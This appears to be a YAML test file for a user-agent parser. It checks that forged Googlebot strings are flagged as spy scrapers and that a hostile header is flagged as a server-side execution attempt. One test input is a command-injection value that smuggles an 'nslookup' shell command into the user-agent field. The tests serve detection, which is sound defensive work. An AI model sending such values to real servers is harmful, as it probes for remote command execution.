      user_agent_string: 'Mozilla/5.0 (compatible; Googlebot/2.1 +http://www.googlebot.com/bot.html)'
    expected:
      DeviceClass                          : 'Spy'
      DeviceName                           : 'Googlebot immitator'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      AgentInformationUrl                  : 'http://www.googlebot.com/bot.html'
      HackerAttackVector                   : 'Spy scraper'
      HackerToolkit                        : 'Googlebot immitator'

- test:
    input:
      user_agent_string: 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'
    expected:
      DeviceClass                          : 'Spy'
      DeviceName                           : 'Googlebot immitator'
      DeviceBrand                          : 'Hacker'
      DeviceVersion                        : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      AgentInformationUrl                  : 'http://www.googlebot.com/bot.html'
      HackerAttackVector                   : 'Spy scraper'
      HackerToolkit                        : 'Googlebot immitator'

#- test:
#    input:
#      user_agent_string: '!(()&&!|*|*|'

- test:
    input:
      user_agent_string: '"&nslookup aCCYKsw4&''\\\""`0&nslookup aCCYKsw4&`''"'
    expected:
      DeviceClass                          : 'Hacker'
      DeviceName                           : 'Hacker'
      DeviceBrand                          : 'Hacker'
      OperatingSystemClass                 : 'Hacker'
      OperatingSystemName                  : 'Hacker'
      OperatingSystemVersion               : 'Hacker'
      OperatingSystemNameVersion           : 'Hacker'
      LayoutEngineClass                    : 'Hacker'
      LayoutEngineName                     : 'Hacker'
      LayoutEngineVersion                  : 'Hacker'
      LayoutEngineVersionMajor             : 'Hacker'
      LayoutEngineNameVersion              : 'Hacker'
      LayoutEngineNameVersionMajor         : 'Hacker'
      AgentClass                           : 'Hacker'
      AgentName                            : 'Hacker'
      AgentVersion                         : 'Hacker'
      AgentVersionMajor                    : 'Hacker'
      AgentNameVersion                     : 'Hacker'
      AgentNameVersionMajor                : 'Hacker'
      HackerAttackVector                   : 'Serverside execute'
      HackerToolkit                        : 'Unknown'

